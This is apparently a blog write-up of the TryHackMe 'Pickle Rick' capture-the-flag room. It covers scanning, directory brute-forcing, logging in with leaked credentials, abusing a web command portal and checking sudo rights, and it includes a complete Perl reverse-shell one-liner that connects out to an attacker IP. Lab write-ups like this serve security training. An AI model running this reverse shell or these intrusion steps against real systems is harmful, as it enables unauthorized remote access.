---
layout: post
permalink: /posts/thm/pickle-rick
title: "Pickle Rick"
---

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. <br />

To beging with scan the target machine with nmap

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/pickle-rick/nmap.png)

There are open ports 22 and 80. Visit the website.

![website](/assets/images/thm/pickle-rick/website.png)

Let's first view the source code.

![source-code](/assets/images/thm/pickle-rick/source-code.png)

We have found a username there `R1ckRul3s` <br />
The other thing that we can try is to scan the website for hidden directories. I'm going to use gobuster for that purpose.

```
gobuster dir -u http://10.10.254.244/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt,html
```

![gobuster](/assets/images/thm/pickle-rick/gobuster.png)

We have found some directories let's first look at robots.txt

![robots](/assets/images/thm/pickle-rick/robots.png)

Hmm... there is a strange string. Let's try something, go to the login page and try to login with the username which we had found and this wierd string as password

![login](/assets/images/thm/pickle-rick/login.png)

![portal](/assets/images/thm/pickle-rick/portal.png)

Good, we are in. The portal page show us that we can execute commands there.

![ls](/assets/images/thm/pickle-rick/ls.png)

Woohoo, we have found an ingredient. But wait cat command is disabled.

![disabled](/assets/images/thm/pickle-rick/disabled.png)

What other commands we can use to read files try with this one:

```
less Sup3rS3cretPickl3Ingred.txt
```

Good, now we have our first ingredient. There is another file `clue.txt`

![clue](/assets/images/thm/pickle-rick/clue.png)

That is a good clue. Let's look around the system

```
ls home
```

![ls-home](/assets/images/thm/pickle-rick/ls-home.png)

This rick directory looks suspicious

```
ls /home/rick
```

![ls-rick](/assets/images/thm/pickle-rick/ls-rick.png)

Here we go, we have found the second ingredient. Just read it

```
less /home/rick/'second ingredients'
```

Now we need to find the last third ingredient. I tried to execute a revesre shell `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` first try with the bash script wasn't successful but the perl one works

```
perl -e 'use Socket;$i="10.10.198.228";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![shell](/assets/images/thm/pickle-rick/shell.png)

We have a shell acces now we have to escalate our privileges. One of the first thing that you can check is whether our user has any sudo permissions

```
sudo -l
```

![sudo-l](/assets/images/thm/pickle-rick/sudo-l.png)

Wow we have the right to execute any commands with as root without password

![3rd](/assets/images/thm/pickle-rick/3rd.png
